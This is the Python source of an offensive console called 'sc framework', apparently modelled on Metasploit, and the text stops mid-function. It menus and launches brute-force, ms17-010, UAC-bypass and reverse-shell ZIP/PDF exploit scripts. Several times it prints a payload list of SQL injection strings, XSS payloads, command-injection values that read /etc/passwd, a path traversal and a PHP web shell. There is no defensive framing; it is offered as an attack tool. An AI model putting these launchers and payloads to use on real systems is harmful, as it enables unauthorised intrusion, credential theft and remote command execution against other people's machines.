# This tool haves some tools in /sc_framework/tools/ .
# haves some exploit and wireless attack tools in /tools/ directory.
# imports

import os
import time
import random
from exploits import *
from payloads import *

#colors
class color:
    red = '\33[91m'
    blue = '\033[94m'
    white = '\033[0m'
    underline = '\033[4m'
    green = '\033[92m'
    warning = '\033[93m'



def start():
    os.system('clear')
    print("starting sc console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting Sc console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sC console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc Console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc cOnsole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc coNsole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc conSole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consOle...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consoLe...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consolE...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc console...")
    time.sleep(0.3)
    os.system('clear')


def Menu():
    list = [color.blue + """
  ██████  ▄████▄  
▒██    ▒ ▒██▀ ▀█  
░ ▓██▄   ▒▓█    ▄ 
  ▒   ██▒▒▓▓▄ ▄██▒
▒██████▒▒▒ ▓███▀ ░
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░
░ ░▒  ░ ░  ░  ▒   
░  ░  ░  ░        
      ░  ░ ░      
         ░        

  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
 ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
""",
color.red + """
 ▄▀▀▀▀▄  ▄▀▄▄▄▄  
█ █   ▐ █ █    ▌ 
   ▀▄   ▐ █      
▀▄   █    █      
 █▀▀▀    ▄▀▄▄▄▄▀ 
 ▐      █     ▐  
        ▐        

 ▄▀▀▀█▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄    ▄▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █ 
█  ▄▀  ▀▄ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ ▐  ▄▀   ▐ █   █    ▐  █ █      █ █   █   █ █  █ ▄▀ 
▐ █▄▄▄▄   ▐  █▀▀█▀    █▄▄▄█ ▐  █    █   █▄▄▄▄▄  ▐  █        █ █      █ ▐  █▀▀█▀  ▐  █▀▄  
 █    ▐    ▄▀    █   ▄▀   █   █    █    █    ▌    █   ▄    █  ▀▄    ▄▀  ▄▀    █    █   █ 
 █        █     █   █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▄      ▀▄▀ ▀▄ ▄▀    ▀▀▀▀   █     █   ▄▀   █  
█         ▐     ▐   ▐   ▐   █    █     █    ▐            ▀             ▐     ▐   █    ▐  
▐                           ▐    ▐     ▐                                         ▐       
""",
color.green + """
              ┬                                    ┬
              │────────────────────────────────────│
              o                                    o
              ┬              ┌─┐┌─┐                ┬
              │              └─┐│                  │
              o              └─┘└─┘                o
              ┬    ┌─┐┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─     ┬ 
              │    ├┤ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐     │ 
              o    └  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴     o 
              ┬                                    ┬
              │────────────────────────────────────│
              o                                    o
""",
color.warning + """
                    .▄▄ ·  ▄▄·                                 
                    ▐█ ▀. ▐█ ▌▪                                
                    ▄▀▀▀█▄██ ▄▄                                
                    ▐█▄▪▐█▐███▌                                
                     ▀▀▀▀ ·▀▀▀                                 
    ·▄▄▄▄▄▄   ▄▄▄· • ▌ ▄ ·. ▄▄▄ .▄▄▌ ▐ ▄▌      ▄▄▄  ▄ •▄       
    ▐▄▄·▀▄ █·▐█ ▀█ ·██ ▐███▪▀▄.▀·██· █▌▐█▪     ▀▄ █·█▌▄▌▪      
    ██▪ ▐▀▀▄ ▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐▀▀▄·      
    ██▌.▐█•█▌▐█ ▪▐▌██ ██▌▐█▌▐█▄▄▌▐█▌██▐█▌▐█▌.▐▌▐█•█▌▐█.█▌      
    ▀▀▀ .▀  ▀ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀·▀  ▀      
"""]
    random_banner = random.choice(list)
    print(random_banner)
    print()
    print(color.white + "you can use some of the tools from: ",os.getcwd(),"/tools/")
    print()
    print("to see help menu type 'help' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
    print("when you choose a exploit, you will type the options when you run the exploit!")
    print("22 exploits / 8 payloads")
    Console()


def Console():
    scconsole = input("sc~>")
    if scconsole == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
use <exploit> ---> to use the exploit.
search ---> to see the search options.
exit ---> to exit from sc-console.
show payloads ---> to see avalable payloads in sc-framework.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
""")
    elif scconsole == "h":
        print("""
help ---> to see the full help menu.
clear ---> to clear the screen.
search ---> to see the search options.
exit ---> to exit from sc-console.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
""")
    elif scconsole == "show options":
        print("""
PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
""")
    elif scconsole == "clear":
        os.system('clear')
    elif scconsole == "search":
        print("""
search <exploit | windows | site>        
""")
    elif scconsole == "search exploits":
        print("""
    Exploits                         When created?        Discrepstion 
exploit/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
exploit/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
exploit/tomcat-mgr-login             24/01/12 04:23       for brute force login pages.
exploit/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
exploit/bypassuac-eventvwr           24/01/13 10:39       for execute the command with elevated privileges on the target.
exploit/find-vulnerabilites-scan     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
exploit/XSS                          24/01/14 09:35       for alert the XSS attack in html file.
exploit/find_vulnerabilites_website  24/01/14 11:40       for finding vulnerabilite in the target website.
exploit/find-vulnerabilites-website2 24/01/14 12:31       for finding vulnerabilite with payload you specified.
exploit/ZIP-exploit                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
exploit/PDF-exploit                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
exploit/ssh-version                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
exploiit/ftp-login-test              24/01/19 11:15       for login on port 21 or 20 ftp port.
exploit/http-login-test              24/01/19 12:01       for login on port 80 http port.
exploit/reverse-shell                24/01/20 01:12       for get a reverse shell by sending a link.
exploit/handler/handler              24/01/22 02:34       for listen on the target to open the exploit2.php.
exploit/handler/listining            24/01/22 04:12       for listen on the target to open the exploit.php.
""")
    elif scconsole == "search exploit":
        print("""
    Exploits                         When created?        Discrepstion 
exploit/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
exploit/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
exploit/tomcat-mgr-login             24/01/12 04:23       for brute force login pages.
exploit/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
exploit/bypassuac-eventvwr           24/01/13 10:39       for execute the command with elevated privileges on the target.
exploit/find-vulnerabilites-scan     24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
exploit/XSS                          24/01/14 09:35       for alert the XSS attack in html file.
exploit/find_vulnerabilites_website  24/01/14 11:40       for finding vulnerabilite in the target website.
exploit/find-vulnerabilites-website2 24/01/14 12:31       for finding vulnerabilite with payload you specified.
exploit/ZIP-exploit                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
exploit/PDF-exploit                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
exploit/ssh-version                  24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
exploiit/ftp-login-test              24/01/19 11:15       for login on port 21 or 20 ftp port.
exploit/http-login-test              24/01/19 12:01       for login on port 80 http port.
exploit/reverse-shell                24/01/20 01:12       for get a reverse shell by sending a link.
exploit/handler/handler              24/01/22 02:34       for listen on the target to open the exploit2.php.
exploit/handler/listining            24/01/22 04:12       for listen on the target to open the exploit.php.
""")
    elif scconsole == "search windows":
        print("""
    Exploits                         When created?        Discrepstion 
windows/PDF-exploit                  24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
windows/ftp-login-test               24/01/19 11:15       for login on port 21 or 20 ftp port.
windows/java-rhino                   24/01/12 02:45       for excuteshellcommand http port.
windows/ms17-010-psexec              24/01/13 08:20       for brute force windows smb port.
windows/ssh-login-test               24/01/11 05:54       for brute forcing ssh port.
""")
    elif scconsole == "search site":
        print("""
    Exploits                         When created?        Discrepstion 
site/XSS                          24/01/14 09:35       for alert the XSS attack in html file.
site/find_vulnerabilites_website  24/01/14 11:40       for finding vulnerabilite in the target website.
site/find-vulnerabilites-website2 24/01/14 12:31       for finding vulnerabilite with payload you specified.
site/http-login-test              24/01/19 12:01       for login on port 80 http port.
site/ZIP-exploit                  24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
site/tomcat-mgr-login             24/01/12 04:23       for brute force login pages.
""")
    elif scconsole == "show payloads":
        print("""
' OR 1=1--   ---> SQL Injection payload.

' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.

<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

;whoami  ---> remote code execute whoami payload.

;cat /etc/passwd  ---> remote code execute cat payload.

../../../../etc/passwd  ---> directory traversal etc/passwd payload.

<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
""")
    elif scconsole == "use exploit/ssh-login-test":
        time.sleep(0.5)
        exploitsshlogintest()
        print("using exploit/ssh-login-test.")
    elif scconsole == "use exploit/java-rhino":
        time.sleep(0.5)
        exploitjavarhino()
        print("using exploit/java-rhino.")
    elif scconsole == "use exploit/tomcat-mgr-login":
        time.sleep(0.5)
        exploittomcatmgrlogin()
        print("using exploit/tomcat-mgr-login.")
    elif scconsole == "use exploit/ms17-010-psexec":
        time.sleep(0.5)
        exploitms17010psexec()
        print("using exploit/ms17-010-psexec.")
    elif scconsole == "use exploit/bypassuac-eventvwr":
        time.sleep(0.5)
        exploitbypassuaceventvwr()
        print("using exploit/bypassuac-eventvwr.")
    elif scconsole == "use exploit/find-vulnerabilites-scan":
        time.sleep(0.5)
        exploitfindvulnerabilitesscan()
        print("using exploit/find-vulnerabilites-scan.")
    elif scconsole == "use exploit/XSS":
        time.sleep(0.5)
        exploitXSS()
        print("using exploit/XSS.")
    elif scconsole == "use exploit/find_vulnerabilites_website":
        time.sleep(0.5)
        exploitfindvulnerabiliteswebsite()
        print("using exploit/find_vulnerabilites_website.")
    elif scconsole == "use exploit/find-vulnerabilites-website2":
        time.sleep(0.5)
        exploitfindvulnerabiliteswebsite2()
        print("using exploit/find-vulnerabilites-website2.")
    elif scconsole == "use exploit/ZIP-exploit":
        time.sleep(0.5)
        exploitZIPexploit()
        print("using exploit/ZIP-exploit.")
    elif scconsole == "use exploit/PDF-exploit":
        time.sleep(0.5)
        exploitPDFexploit()
        print("using exploit/PDF-exploit.")
    elif scconsole == "use exploit/ssh-version":
        time.sleep(0.5)
        exploitsshversion()
        print("using exploit/ssh-version.")
    elif scconsole == "use exploit/ftp-login-test":
        time.sleep(0.5)
        exploitftplogintest()
        print("using exploit/ftp-login-test.")
    elif scconsole == "use exploit/http-login-test":
        time.sleep(0.5)
        exploithttplogintest()
        print("using exploit/http-login-test.")
    elif scconsole == "use exploit/reverse-shell":
        time.sleep(0.5)
        exploitreverseshell()
        print("using exploit/reverse-shell.")
    elif scconsole == "use exploit/handler/handler":
        time.sleep(0.5)
        exploithandlerhandler()
        print("using exploit/handler/handler.")
    elif scconsole == "use exploit/handler/listining":
        time.sleep(0.5)
        exploithandlerlistining()
        print("using exploit/handler/listining.")
    elif scconsole == "use windows/ssh-login-test":
        time.sleep(0.5)
        wexploitsshlogintest()
        print("using windows/ssh-login-test.")
    elif scconsole == "use windows/java-rhino":
        time.sleep(0.5)
        wexploitjavarhino()
        print("using windows/java-rhino.")
    elif scconsole == "use windows/ms17-010-psexec":
        time.sleep(0.5)
        wexploitms17010psexec()
        print("using windows/ms17-010-psexec.")
    elif scconsole == "use windows/PDF-exploit":
        time.sleep(0.5)
        wexploitPDFexploit()
        print("using windows/PDF-exploit.")
    elif scconsole == "use windows/ftp-login-test":
        time.sleep(0.5)
        wexploitftplogintest()
        print("using windows/ftp-login-test.")
    elif scconsole == "use site/XSS":
        time.sleep(0.5)
        texploitXSS()
        print("using site/XSS.")
    elif scconsole == "use site/find_vulnerabilites_website":
        time.sleep(0.5)
        texploitfindvulnerabiliteswebsite()
        print("using site/find_vulnerabilites_website.")
    elif scconsole == "use site/find-vulnerabilites-website2":
        time.sleep(0.5)
        texploitfindvulnerabiliteswebsite2()
        print("using site/find-vulnerabilites-website2.")
    elif scconsole == "use site/http-login-test":
        time.sleep(0.5)
        texploithttplogintest()
        print("using site/http-login-test.")
    elif scconsole == "use site/ZIP-exploit":
        time.sleep(0.5)
        texploitZIPexploit()
        print("using site/ZIP-exploit.")
    elif scconsole == "use site/tomcat-mgr-login":
        time.sleep(0.5)
        texploittomcatmgrlogin()
        print("using site/tomcat-mgr-login.")
    elif scconsole == "use system commands":
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "use system command":
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "exit":
        exit()
    else:
        time.sleep(0.5)
        print("there is no command or option to use like that!")

def exploitsshlogintest():
    scconsole3 = input("sc~" + color.red + "(exploit/ssh-login-test)" + color.white + ">")
    if scconsole3 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitsshlogintest()
    elif scconsole3 == "clear":
        os.system('clear')
        exploitsshlogintest()
    elif scconsole3 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specifiy the password list path.
USERNAMELIST  | specifiy the username list path.

you will specifiy these options when you run or exploit it!
""")
        exploitsshlogintest()
    elif scconsole3 == "run":
        os.system('python exploits/ssh-login-test.py')
        exploitsshlogintest()
    elif scconsole3 == "exploit":
        os.system('python exploits/ssh-login-test.py')
        exploitsshlogintest()
    elif scconsole3 == "unuse":
        print("unusing exploit/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole3 == "exit":
        exit()

def exploitjavarhino():
    scconsole4 = input("sc~" + color.red + "(exploit/java-rhino)" + color.white + ">")
    if scconsole4 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitjavarhino()
    elif scconsole4 == "clear":
        os.system('clear')
        exploitjavarhino()
    elif scconsole4 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address.
LPORT         | specifiy the target port (port 445 needs to open on target).
CMD           | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitjavarhino()
    elif scconsole4 == "run":
        os.system('python exploits/java-rhino.py')
        exploitjavarhino()
    elif scconsole4 == "exploit":
        os.system('python exploits/java-rhino.py')
        exploitjavarhino()
    elif scconsole4 == "unuse":
        print("unusing exploit/java-rhino.")
        time.sleep(0.5)
        Console()
    elif scconsole4 == "exit":
        exit()

def exploittomcatmgrlogin():
    scconsole5 = input("sc~" + color.red + "(exploit/tomcat-mgr-login)" + color.white + ">")
    if scconsole5 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploittomcatmgrlogin()
    elif scconsole5 == "clear":
        os.system('clear')
        exploittomcatmgrlogin()
    elif scconsole5 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target url.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
BRUTEFORCE-SPEED | specifiy the brute force speed.

you will specifiy these options when you run or exploit it!
""")
        exploittomcatmgrlogin()
    elif scconsole5 == "run":
        os.system('python exploits/tomcat-mgr-login.py')
        exploittomcatmgrlogin()
    elif scconsole5 == "exploit":
        os.system('python exploits/tomcat-mgr-login.py')
        exploittomcatmgrlogin()
    elif scconsole5 == "unuse":
        print("unusing exploit/tomcat-mgr-login.")
        time.sleep(0.5)
        Console()
    elif scconsole5 == "exit":
        exit()

def exploitms17010psexec():
    scconsole6 = input("sc~" + color.red + "(exploit/ms17-010-psexec)" + color.white + ">")
    if scconsole6 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitms17010psexec()
    elif scconsole6 == "clear":
        os.system('clear')
        exploittomcatmgrlogin()
    elif scconsole6 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
CMD              | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitms17010psexec()
    elif scconsole6 == "run":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "exploit":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "unuse":
        print("unusing exploit/ms17-010-psexec.")
        time.sleep(0.5)
        Console()
    elif scconsole6 == "exit":
        exit()

def exploitbypassuaceventvwr():
    scconsole7 = input("sc~" + color.red + "(exploit/bypassuac-eventvwr)" + color.white + ">")
    if scconsole7 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "clear":
        os.system('clear')
        exploitbypassuaceventvwr()
    elif scconsole7 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
CMD              | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "run":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "exploit":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "unuse":
        print("unusing exploit/bypassuac-eventvwr.")
        time.sleep(0.5)
        Console()
    elif scconsole7 == "exit":
        exit()

def exploitfindvulnerabilitesscan():
    scconsole8 = input("sc~" + color.red + "(exploit/find-vulnerabilites-scan)" + color.white + ">")
    if scconsole8 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "clear":
        os.system('clear')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.

you will specifiy these options when you run or exploit it!
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "run":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "exploit":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "unuse":
        print("unusing exploit/find-vulnerabilites-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole8 == "exit":
        exit()

def exploitfindvulnerabiliteswebsite():
    scconsole9 = input("sc~" + color.red + "(exploit/find-vulnerabilites-website)" + color.white + ">")
    if scconsole9 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        exploitfindvulnerabiliteswebsite()
    elif scconsole9 == "clear":
        os.system('clear')
        exploitfindvulnerabiliteswebsite()
    elif scconsole9 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
PAYLOAD          | specifiy the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        exploitfindvulnerabiliteswebsite()
    elif scconsole9 == "show payloads":
        print("""
' OR 1=1--   ---> SQL Injection payload.

' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.

<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

;whoami  ---> remote code execute whoami payload.

;cat /etc/passwd  ---> remote code execute cat payload.

../../../../etc/passwd  ---> directory traversal etc/passwd payload.

<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
""")
        exploitfindvulnerabiliteswebsite()
    elif scconsole9 == "run":
        os.system('python exploits/find_vulnerabilites_website.py')
        exploitfindvulnerabiliteswebsite()
    elif scconsole9 == "exploit":
        os.system('python exploits/find_vulnerabilites_website.py')
        exploitfindvulnerabiliteswebsite()
    elif scconsole9 == "unuse":
        print("unusing exploit/find_vulnerabilites_website.")
        time.sleep(0.5)
        Console()
    elif scconsole9 == "exit":
        exit()

def exploitfindvulnerabiliteswebsite2():
    scconsole10 = input("sc~" + color.red + "(exploit/find-vulnerabilites-website2)" + color.white + ">")
    if scconsole10 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        exploitfindvulnerabiliteswebsite2()
    elif scconsole10 == "clear":
        os.system('clear')
        exploitfindvulnerabiliteswebsite2()
    elif scconsole10 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
PAYLOAD          | specifiy the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        exploitfindvulnerabiliteswebsite2()
    elif scconsole10 == "show payloads":
        print("""
' OR 1=1--   ---> SQL Injection payload.

' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.

<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

;whoami  ---> remote code execute whoami payload.

;cat /etc/passwd  ---> remote code execute cat payload.

../../../../etc/passwd  ---> directory traversal etc/passwd payload.

<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
""")
        exploitfindvulnerabiliteswebsite2()
    elif scconsole10 == "run":
        os.system('python exploits/find-vulnerabilites-website2.py')
        exploitfindvulnerabiliteswebsite2()
    elif scconsole10 == "exploit":
        os.system('python exploits/find-vulnerabilites-website2.py')
        exploitfindvulnerabiliteswebsite2()
    elif scconsole10 == "unuse":
        print("unusing exploit/find-vulnerabilites-website2.")
        time.sleep(0.5)
        Console()
    elif scconsole10 == "exit":
        exit()

def exploitXSS():
    scconsole11 = input("sc~" + color.red + "(exploit/XSS)" + color.white + ">")
    if scconsole11 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitXSS()
    elif scconsole11 == "clear":
        os.system('clear')
        exploitXSS()
    elif scconsole11 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!

this is not exploit, this for try the payload!
payload = <img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
""")
        exploitXSS()
    elif scconsole11 == "run":
        os.system('firefox exploits/XSS.html')
        exploitXSS()
    elif scconsole11 == "exploit":
        os.system('firefox exploits/XSS.html')
        exploitXSS()
    elif scconsole11 == "unuse":
        print("unusing exploit/XSS.")
        time.sleep(0.5)
        Console()
    elif scconsole11 == "exit":
        exit()

def exploitsshversion():
    scconsole12 = input("sc~" + color.red + "(exploit/ssh-version)" + color.white + ">")
    if scconsole12 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitsshversion()
    elif scconsole12 == "clear":
        os.system('clear')
        exploitsshversion()
    elif scconsole12 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).

you will specifiy these options when you run or exploit it!
""")
        exploitsshversion()
    elif scconsole12 == "run":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "exploit":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "unuse":
        print("unusing exploit/ssh-version.")
        time.sleep(0.5)
        Console()
    elif scconsole12 == "exit":
        exit()

def exploitZIPexploit():
    scconsole13 = input("sc~" + color.red + "(exploit/ZIP-exploit)" + color.white + ">")
    if scconsole13 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitZIPexploit()
    elif scconsole13 == "clear":
        os.system('clear')
        exploitZIPexploit()
    elif scconsole13 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url to upload zip file.

you will specifiy these options when you run or exploit it!
""")
        exploitZIPexploit()
    elif scconsole13 == "run":
        os.system('python exploits/ZIP-exploit.py')
        exploitZIPexploit()
    elif scconsole13 == "exploit":
        os.system('python exploits/ZIP-exploit.py')
        exploitZIPexploit()
    elif scconsole13 == "unuse":
        print("unusing exploit/ZIP-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole13 == "exit":
        exit()

def exploitPDFexploit():
    scconsole13 = input("sc~" + color.red + "(exploit/PDF-exploit)" + color.white + ">")
    if scconsole13 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitPDFexploit()
    elif scconsole13 == "clear":
        os.system('clear')
        exploitPDFexploit()
    elif scconsole13 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploitPDFexploit()
    elif scconsole13 == "run":
        os.system('python exploits/PDF-exploit.py')
        exploitPDFexploit()
    elif scconsole13 == "exploit":
        os.system('python exploits/PDF-exploit.py')
        exploitPDFexploit()
    elif scconsole13 == "unuse":
        print("unusing exploit/PDF-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole13 == "exit":
        exit()

def exploitftplogintest():
    scconsole14 = input("sc~" + color.red + "(exploit/ftp-login-test)" + color.white + ">")
    if scconsole14 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitftplogintest()
    elif scconsole14 == "clear":
        os.system('clear')
        exploitftplogintest()
    elif scconsole14 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
